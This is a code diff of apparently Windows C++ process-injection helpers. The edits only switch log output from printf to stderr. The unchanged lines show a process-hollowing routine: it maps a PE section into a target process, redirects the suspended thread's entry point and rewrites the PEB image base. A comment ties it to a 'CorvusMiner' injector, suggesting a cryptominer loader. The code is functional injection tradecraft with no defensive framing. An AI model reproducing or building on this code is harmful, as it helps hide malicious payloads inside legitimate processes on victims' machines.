@@ -35,20 +35,20 @@ static bool load_map_api()
 PVOID map_section_into_process(HANDLE hProcess, HANDLE hSection, DWORD payload_size, const BYTE *pe_buffer)
 {
     if (!load_map_api()) {
-        printf("[injection_helpers] NtMapViewOfSection not available\n");
+        fprintf(stderr, "[injection_helpers] NtMapViewOfSection not available\n");
         return nullptr;
     }
 
-    printf("[injection_helpers] map_section_into_process called: hProcess=%p, hSection=%p, payload_size=%lu\n", 
+    fprintf(stderr, "[injection_helpers] map_section_into_process called: hProcess=%p, hSection=%p, payload_size=%lu\n", 
            hProcess, hSection, payload_size);
 
     SIZE_T view_size = 0;
     PVOID base_address = 0;
 
     /* Exact match of map_buffer_into_process from CorvusMiner inject_core.cpp */
-    printf("[injection_helpers] Calling NtMapViewOfSection with ViewShare=2, PAGE_READONLY\n");
+    fprintf(stderr, "[injection_helpers] Calling NtMapViewOfSection with ViewShare=2, PAGE_READONLY\n");
     long status = g_NtMapViewOfSection(hSection, hProcess, &base_address, NULL, NULL, NULL, &view_size, 2, NULL, PAGE_READONLY);
-    printf("[injection_helpers] NtMapViewOfSection returned: status=0x%lX, base_address=%p, view_size=0x%llX\n", 
+    fprintf(stderr, "[injection_helpers] NtMapViewOfSection returned: status=0x%lX, base_address=%p, view_size=0x%llX\n", 
            (unsigned long)status, base_address, (ULONGLONG)view_size);
     
     if (status != 0) {
@@ -57,17 +57,17 @@ PVOID map_section_into_process(HANDLE hProcess, HANDLE hSection, DWORD payload_s
            addresses in the image are wrong at the new base and the process will crash. */
         if ((ULONG)status == 0x40000003) {
             if (!pe_has_relocations(pe_buffer)) {
-                printf("[injection_helpers] STATUS_IMAGE_NOT_AT_BASE and PE has no relocations - cannot run at relocated base, aborting\n");
+                fprintf(stderr, "[injection_helpers] STATUS_IMAGE_NOT_AT_BASE and PE has no relocations - cannot run at relocated base, aborting\n");
                 return nullptr;
             }
-            printf("[injection_helpers] WARNING: Image mapped at non-preferred base (has relocations, continuing)\n");
+            fprintf(stderr, "[injection_helpers] WARNING: Image mapped at non-preferred base (has relocations, continuing)\n");
         } else {
-            printf("[injection_helpers] NtMapViewOfSection failed: 0x%lX\n", (unsigned long)status);
+            fprintf(stderr, "[injection_helpers] NtMapViewOfSection failed: 0x%lX\n", (unsigned long)status);
             return nullptr;
         }
     }
 
-    printf("[injection_helpers] Mapped base: 0x%llX, view size: 0x%llX\n", (ULONGLONG)base_address, (ULONGLONG)view_size);
+    fprintf(stderr, "[injection_helpers] Mapped base: 0x%llX, view size: 0x%llX\n", (ULONGLONG)base_address, (ULONGLONG)view_size);
 
     Sleep(20);
     FlushViewOfFile(base_address, view_size);
@@ -77,21 +77,21 @@ PVOID map_section_into_process(HANDLE hProcess, HANDLE hSection, DWORD payload_s
 
 bool redirect_entry_point(BYTE* loaded_pe, PVOID load_base, PROCESS_INFORMATION& pi)
 {
-    printf("[injection_helpers] redirect_entry_point called: loaded_pe=%p, load_base=%p, hThread=%p\n", 
+    fprintf(stderr, "[injection_helpers] redirect_entry_point called: loaded_pe=%p, load_base=%p, hThread=%p\n", 
            loaded_pe, load_base, pi.hThread);
     
     /* Calculate VA of entry point */
     DWORD ep_rva = get_entry_point_rva(loaded_pe);
     ULONGLONG ep_va = (ULONGLONG)load_base + ep_rva;
 
-    printf("[injection_helpers] Entry point VA: 0x%llX (RVA: 0x%lX)\n", ep_va, ep_rva);
+    fprintf(stderr, "[injection_helpers] Entry point VA: 0x%llX (RVA: 0x%lX)\n", ep_va, ep_rva);
 
     /* Get thread context */
     CONTEXT context = {0};
     context.ContextFlags = CONTEXT_FULL;
 
     if (!GetThreadContext(pi.hThread, &context)) {
-        printf("[injection_helpers] GetThreadContext failed: %lu\n", GetLastError());
+        fprintf(stderr, "[injection_helpers] GetThreadContext failed: %lu\n", GetLastError());
         return false;
     }
 
@@ -104,11 +104,11 @@ bool redirect_entry_point(BYTE* loaded_pe, PVOID load_base, PROCESS_INFORMATION&
 
     /* Set modified context */
     if (!SetThreadContext(pi.hThread, &context)) {
-        printf("[injection_helpers] SetThreadContext failed: %lu\n", GetLastError());
+        fprintf(stderr, "[injection_helpers] SetThreadContext failed: %lu\n", GetLastError());
         return false;
     }
 
-    printf("[injection_helpers] Entry point redirected successfully\n");
+    fprintf(stderr, "[injection_helpers] Entry point redirected successfully\n");
 
     Sleep(100);
 
@@ -127,10 +127,10 @@ bool redirect_entry_point(BYTE* loaded_pe, PVOID load_base, PROCESS_INFORMATION&
     LPVOID remote_img_base = (LPVOID)(peb_addr + img_base_offset);
     SIZE_T written = 0;
     if (!WriteProcessMemory(pi.hProcess, remote_img_base, &load_base, sizeof(load_base), &written)) {
-        printf("[injection_helpers] WriteProcessMemory (PEB ImageBase) failed: %lu\n", GetLastError());
+        fprintf(stderr, "[injection_helpers] WriteProcessMemory (PEB ImageBase) failed: %lu\n", GetLastError());
         /* Non-fatal: entry point is already set */
     } else {
-        printf("[injection_helpers] PEB ImageBaseAddress updated\n");
+        fprintf(stderr, "[injection_helpers] PEB ImageBaseAddress updated\n");
     }
 
     return true;
